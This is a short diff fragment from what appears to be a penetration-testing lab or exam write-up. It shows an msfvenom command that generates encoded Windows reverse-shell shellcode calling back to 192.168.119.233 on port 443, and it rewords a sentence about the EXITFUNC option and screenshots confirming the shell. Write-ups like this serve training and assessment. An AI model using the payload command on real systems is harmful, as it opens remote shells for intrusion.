@@ -415,4 +415,4 @@ This was avoided by using the _ExitThread_ API by generating the shellcode via t
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.233 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
 
-As we already included the "EXITFUNC=thread" in 
+(We already included the "EXITFUNC=thread" in our previous command, please see above screenshots for reverse shell confirmation)
